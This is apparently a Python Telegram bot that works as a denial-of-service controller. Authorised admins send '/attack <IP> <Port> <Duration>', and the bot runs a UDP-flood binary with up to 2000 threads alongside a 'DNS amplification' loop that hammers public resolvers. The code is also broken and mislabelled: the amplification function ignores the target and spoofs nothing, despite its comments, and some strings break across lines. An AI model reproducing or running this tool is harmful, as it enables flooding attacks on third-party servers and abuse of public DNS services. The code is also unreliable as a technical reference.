
import os
import subprocess
import logging
import json
import time
import threading
from telebot import TeleBot
from telebot.types import Message
import socket

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger()

# Load configuration from config.json
CONFIG_FILE = "config.json"
try:
    with open(CONFIG_FILE, "r") as file:
        config = json.load(file)
except FileNotFoundError:
    logger.error("Config file not found.")
    exit(1)
except json.JSONDecodeError:
    logger.error("Config file is not a valid JSON.")
    exit(1)

BOT_TOKEN = config.get("BOT_TOKEN")
ADMIN_IDS = config.get("ADMIN_IDS", [])
if not BOT_TOKEN or not ADMIN_IDS:
    logger.error("Missing BOT_TOKEN or ADMIN_IDS in the config file.")
    exit(1)

# Path to the compiled attack binary
BINARY_PATH = "./attack_binary"

# System capacity-based settings
MAX_PACKET_SIZE = 4096  # Adjust based on your system's capability
MAX_THREAD_COUNT = 2000  # Adjust based on your system's capability

# Initialize Telegram bot
bot = TeleBot(BOT_TOKEN)

def dns_amplification(target_ip, duration):
    """DNS Amplification Attack."""
    dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9"]  # Public DNS servers
    query = (
        b"\xaa\xbb"  # Transaction ID
        b"\x01\x00"  # Flags
        b"\x00\x01"  # Questions
        b"\x00\x00"  # Answer RRs
        b"\x00\x00"  # Authority RRs
        b"\x00\x00"  # Additional RRs
        b"\x03www\x06google\x03com\x00"  # Query: www.google.com
        b"\x00\x01"  # Type: A
        b"\x00\x01"  # Class: IN
    )

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        start_time = time.time()
        while time.time() - start_time < duration:
            for dns_server in dns_servers:
                sock.sendto(query, (dns_server, 53))  # Send spoofed request
                logger.info(f"Sent DNS amplification request to {dns_server}")
    except Exception as e:
        logger.error(f"Error during DNS amplification: {e}")
    finally:
        sock.close()

@bot.message_handler(commands=['start'])
def start(message: Message):
    """Handle /start command."""
    user_id = message.from_user.id
    if user_id in ADMIN_IDS:
        bot.reply_to(message, "Welcome, Admin! Use /attack <IP> <Port> <Duration> to launch an attack.")
    else:
        bot.reply_to(message, "You are not authorized to use this bot.")

@bot.message_handler(commands=['attack'])
def attack(message: Message):
    """Handle /attack command to execute the binary and DNS amplification."""
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "You are not authorized to use this command.")
        return

    try:
        # Parse the command arguments
        args = message.text.split()
        if len(args) != 4:
            bot.reply_to(message, "Invalid command format. Use /attack <IP> <Port> <Duration>.")
            return

        target_ip = args[1]
        target_port = int(args[2])
        duration = int(args[3])

        # Validate inputs
        try:
            socket.inet_aton(target_ip)
        except socket.error:
            bot.reply_to(message, "Invalid IP address format.")
            return

        if duration <= 0:
            bot.reply_to(message, "Duration must be a positive integer.")
            return

        # Notify start
        bot.reply_to(message, f"Launching attacks on {target_ip}:{target_port} for {duration} seconds...")

        # Launch DNS amplification in a separate thread
        logger.info("Starting DNS Amplification...")
        dns_thread = threading.Thread(target=dns_amplification, args=(target_ip, duration))
        dns_thread.start()

        # Launch UDP flood using binary
        logger.info("Starting UDP Flood...")
        command = [BINARY_PATH, target_ip, str(target_port), str(duration), str(MAX_PACKET_SIZE), str(MAX_THREAD_COUNT)]
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # Wait for the attacks to finish
        dns_thread.join()
        stdout, stderr = process.communicate()

        # Notify completion
        if process.returncode == 0:
            bot.reply_to(message, f"Attacks completed successfully on {target_ip}:{target_port}.
Binary Output:
{stdout.decode()}")
        else:
            bot.reply_to(message, f"An error occurred during the UDP flood:
{stderr.decode()}")

    except Exception as e:
        logger.error(f"Error: {e}")
        bot.reply_to(message, f"An error occurred: {e}")

if __name__ == "__main__":
    logger.info("Bot is running...")
    bot.polling(non_stop=True, interval=0, timeout=30, long_polling_timeout=20)
